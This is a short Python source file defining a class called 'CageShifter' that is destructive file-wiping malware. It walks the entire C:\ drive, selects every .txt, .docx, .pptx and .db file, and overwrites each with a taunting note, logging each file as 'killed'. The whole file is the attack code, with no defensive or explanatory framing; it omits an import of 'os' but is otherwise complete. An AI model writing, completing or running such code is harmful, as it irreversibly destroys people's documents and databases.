from pathlib import Path
import time
class CageShifter():
    def __init__(self):
        self.targets = (".txt", ".docx", ".pptx", ".db")
        self.starter = Path("C:\\")
        self.traceback = ""
        self.shiftNote = "Sorry, be carruful for next time :)"
        self.shiftCooldown = 1
        self.Paths = []
        self.targetPaths = []
        self.tracebackList = []

    def killOneFile(self, target):
        try:
            with open(target, "w", encoding="utf-8") as file:
            
                file.write(self.shiftNote)
                self.traceback = f"[INFO] File killed ({target})"
        except Exception as e:
            self.traceback = f"[ERROR] File couldn't be killed ({e})"
        finally:
            return self.traceback

    def foundFiles(self):
        self.Paths = []
        for root, dirs, files in os.walk(self.starter):
            for filename in files:
                full_path = os.path.join(root, filename)
                self.Paths.append(full_path)

        return self.Paths

    def foundNeededFiles(self, pathList):
        self.targetPaths = []
        for path in pathList:
            if path.endswith(self.targets):
                self.targetPaths.append(path)
        return self.targetPaths

    def killThemAll(self, targets):
        self.tracebackList = []
        for targetPath in self.foundNeededFiles(targets):
            self.tracebackList.append(self.killOneFile(targetPath))
            time.sleep(self.shiftCooldown)
        return self.tracebackList

 
        




            


                